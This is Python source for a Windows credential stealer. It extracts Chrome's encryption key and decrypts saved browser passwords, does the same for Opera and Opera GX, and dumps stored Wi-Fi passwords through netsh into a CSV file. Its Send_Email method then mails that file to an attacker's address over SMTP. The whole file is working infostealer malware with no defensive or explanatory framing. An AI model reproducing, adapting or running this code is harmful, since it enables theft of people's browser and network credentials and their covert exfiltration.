from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from email import encoders
from lib.subject import subject_text
import smtplib, ssl, os, json, base64, win32crypt
import subprocess as sp

path_local = r'AppData\Local\Google\Chrome\User Data\Local State'

class Vbscript:
    def __init__(self, 
        from_email:str, 
        from_password:str, 
        to_email:str, 
        server:str='smtp.gmail.com', 
        port:int=587) -> None:
        
        self._email_from = from_email
        self._password = from_password
        self._email_to = to_email
        self._server = server
        self._port = port
    
    # chrome
    def getChrome(self, chrome):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome)

    def getPassword(self):
        with open(os.environ['userprofile'] + os.sep + path_local, 'r', encoding='utf-8') as get_path:
            local = get_path.read()
            local = json.loads(local)
        key_master = base64.b64decode(local['os_crypt']["encrypted_key"])
        key_master = key_master[5:]
        key_master = win32crypt.CryptUnprotectData(key_master, None, None, None, 0)[1]
        return key_master

    def decryptPayload(self, secret, payload):
        return secret.decrypt(payload)

    def onSecret(self, aes_key, ivs):
        return AES.new(aes_key, AES.MODE_GCM, ivs)

    def decryptPassword(self, buff, key_master):
        try:
            ivs = buff[3:15]
            payload = buff[15:]
            secret = self.onSecret(key_master, ivs)
            decrypted_passwd = self.decryptPayload(secret, payload)
            decrypted_passwd = decrypted_passwd[:-16].decode()
            return decrypted_passwd
        except Exception as err:
            return f'1: {err}'
    #wifi
    def Get_Wifi_Password(self):
        try:
            get_wifi = sp.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='cp860')
            for network in get_wifi.split('\n'):
                if 'Todos os Perfis de Usuários' in network:
                    two_point = network.find(':')
                    info_network = network[two_point+2:]
                    all_networks = sp.check_output(
                        ['netsh', 'wlan', 'show', 'profiles', info_network, 'key', '=', 'clear'], encoding='cp860'
                        )
                    
                    for passwords in all_networks.split('\n'):
                        if 'Nome SSID' in passwords:
                            two_point1 = network.find(':')
                            names = passwords[two_point1+2:]

                        if 'Conteúdo da Chave' in passwords:
                            two_point2 = network.find(':')
                            passwd = passwords[two_point2+2:]
                            get_network = f'Rede: {names}\nSenha: {passwd}\n\n'
                            with open('fuckyou.csv', 'a') as wifi:
                                wifi.write(f'{get_network}')
                            wifi.close()
        except: ...
        
    # send email
    def Send_Email(self):
        msg = MIMEMultipart()
        msg['Subject'] = subject_text
        msg['From'] = self._email_from
        msg['To'] = self._email_to
        try:
            files = open('fuckyou.csv', 'rb')
            att = MIMEBase('application', 'octet-stream')
            att.set_payload(files.read())
            encoders.encode_base64(att)
            att.add_header(
                'Content-Disposition', 'attachment; filename=fuckyou.csv'
            )
            files.close()
            msg.attach(att)
            
        except Exception as error:
            return error
        
        context = ssl.create_default_context()
        with smtplib.SMTP(self._server, port=self._port) as smtp:
            try:
                smtp.starttls(context=context)
                smtp.login(self._email_from, self._password)
                smtp.sendmail(msg['From'], msg['To'], msg.as_string())
            except Exception as errs:
                return errs
            
    # opera or opera GX
    def getEncryptionKey():
        try:
            try:
                local_state_path = os.path.join(os.environ["userprofile"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State")
            except:
                local_state_path = os.path.join(os.environ["userprofile"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Local State")
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
        except FileNotFoundError:
            pass

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decryptPasswordOP(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except Exception as e:
            print(e)

            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except Exception as Err:
                return Err
